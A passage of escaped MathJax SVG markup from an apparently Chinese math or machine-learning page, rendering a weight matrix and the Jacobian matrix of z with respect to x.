568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3162.6,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1106,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6380.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(8607.2,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1106,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(11826.5,0)\"><path data-c=\"23A4\" d=\"M0 1070V1154H347V-645H263V1070H0Z\" transform=\"translate(0,2136.8)\"/><path data-c=\"23A6\" d=\"M263 -560V1155H347V-644H0V-560H263Z\" transform=\"translate(0,-2146.8)\"/><svg width=\"667\" height=\"2683.5\" y=\"-1091.8\" x=\"0\" viewbox=\"0 670.9 667 2683.5\"><path data-c=\"23A5\" d=\"M263 0V602H347V0H263Z\" transform=\"scale(1,6.687)\"/></svg></g></g><g data-mml-node=\"mstyle\" transform=\"translate(14875,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"mo\" transform=\"translate(16152.8,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(17097.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1606,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g></svg></mjx-container></span> 而雅可比矩阵是： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -7.556ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"78.854ex\" height=\"16.244ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -3839.9 34853.5 7179.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(273.5,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><rect width=\"1338\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1855.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(2911.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"23A1\" d=\"M319 -645V1154H666V1070H403V-645H319Z\" transform=\"translate(0,2685.9)\"/><path data-c=\"23A3\" d=\"M319 -644V1155H403V-560H666V-644H319Z\" transform=\"translate(0,-2695.9)\"/><svg width=\"667\" height=\"3781.9\" y=\"-1640.9\" x=\"0\" viewbox=\"0 945.5 667 3781.9\"><path data-c=\"23A2\" d=\"M319 0V602H403V0H319Z\" transform=\"scale(1,9.423)\"/></svg></g><g data-mml-node=\"mtable\" transform=\"translate(667,0)\"><g data-mml-node=\"mtr\" transform=\"translate(0,2888.3)\"><g data-mml-node=\"mtd\" transform=\"translate(99.9,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(257.8,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><rect width=\"1313.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(2853.1,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(257.8,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g><rect width=\"1313.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(5561.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(7806.4,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(339.8,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 